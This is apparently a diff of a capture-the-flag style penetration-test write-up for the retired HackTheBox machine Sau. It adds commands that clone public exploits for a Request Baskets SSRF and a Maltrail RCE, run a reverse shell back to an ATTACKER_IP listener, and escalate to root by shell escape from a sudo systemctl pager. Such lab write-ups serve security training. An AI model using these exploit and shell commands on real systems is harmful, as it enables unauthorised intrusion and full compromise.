@@ -14,9 +14,9 @@ When an exploit should run but it doesn't, double check for typos. A `/` in plac
 
 ## 1. Executive Summary
 
-A penetration test was conducted against the Sau target system. The assessment identified multiple critical misconfigurations including Server Side Request Forgery (SSRF), Remote Code Execution (RCE), and insecure sudo configuration.
+A penetration test was conducted against the Sau target system. Multiple vulnerabilities were identified, including a Server-Side Request Forgery (SSRF) in Request Baskets, a Remote Code Execution (RCE) vulnerability in Maltrail v0.53, and an insecure sudo configuration.
 
-Initial access was achieved through SSRF forwarding to a filtered port. Further exploitation of a RCE vulnerability resulted in a low-level unprivileged shell. Finally, privilege escalation to root was achieved through abuse of insecure sudo configuration.
+Initial access was achieved by exploiting SSRF to access an internal web service, followed by exploitation of a known RCE vulnerability to gain a shell as a low-privileged user. Privilege escalation to root was achieved via abuse of a sudo-allowed systemctl command that invoked a pager permitting shell escape.
 
 The system was fully compromised.
 
@@ -26,7 +26,7 @@ The system was fully compromised.
 
 - **Target:** 10.129.229.26
 - **Environment:** HackTheBox Sau (Retired Machine)
-- **Testing Window:** 2026-4-5 to 2025-4-7
+- **Testing Window:** 2026-4-5 to 2026-4-7
 - **Objective:** Full system compromise
 
 ---
@@ -49,7 +49,7 @@ Testing followed a standard OSCP methodology:
 A full TCP-port scan was run with Nmap:
 
 ```
-nmap -p- -sCV 10.129.229.26 -T4 -oA sau_tcp
+nmap -p- -sC -sV 10.129.229.26 -T4 -oA sau_tcp
 ```
 
 Open services:
@@ -59,13 +59,15 @@ Open services:
 - 8338/tcp - unknown - filtered
 - 55555/tcp - http - Golang net/http server
 
-Port 55555 was considered for further enumeration based on potential attack surface.
+Interpretation:
+
+Port 55555 hosts a web service and presents the primary attack surface. Other ports are either filtered or standard services.
 
 ---
 
 ## 5. Enumeration
 
-The target IP address was appended to hosts file:
+The target was added to the hosts file:
 
 ```
 echo "10.129.229.26  sau.htb" >> /etc/hosts
@@ -80,6 +82,10 @@ http://sau.htb:55555/web
 A public exploit was found to redirect requests to another target with Server Side Request Forgery (SSRF). This exploit was used to redirect requests from open port 55555 to filtered port 80:
 
 ```
+git clone https://github.com/Khalidhaimur/exploit-request-baskets-1.2.1.git
+
+cd exploit-request-baskets-1.2.1
+
 python3 exploit.py "http://sau.htb:55555" "http://sau.htb"
 ```
 
@@ -106,10 +112,30 @@ nc -lnvp 443
 And the exploit was run:
 
 ```
+git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git
+
+cd Maltrail-v0.53-Exploit
+
 python3 exploit.py ATTACKER_IP 443 http://sau.htb:55555/mbejjt
 ```
 
-This resulted in an unprivileged shell as user `puma` on host `sau`.
+This resulted in an unprivileged shell as user `puma` on host `sau`:
+
+```
+whoami
+
+hostname
+
+ip a
+```
+
+The resulting shell was stabilized:
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+export TERM=xterm
+```
 
 ---
 
@@ -133,13 +159,21 @@ The `systemctl` command run with sudo permissions resulted in a Maltrail Server 
 sudo /usr/bin/systemctl status trail.service
 ```
 
-The inherited vulnerability of `less` was exploited in the pager:
+The inherited vulnerability of `less` was exploited in the pager because the pager allows shell escape with `!`:
 
 ```
 !/bin/sh
 ```
 
-Resulting in a root shell.
+Resulting in a root shell:
+
+```
+whoami
+
+hostname
+
+ip a
+```
 
 ---
 
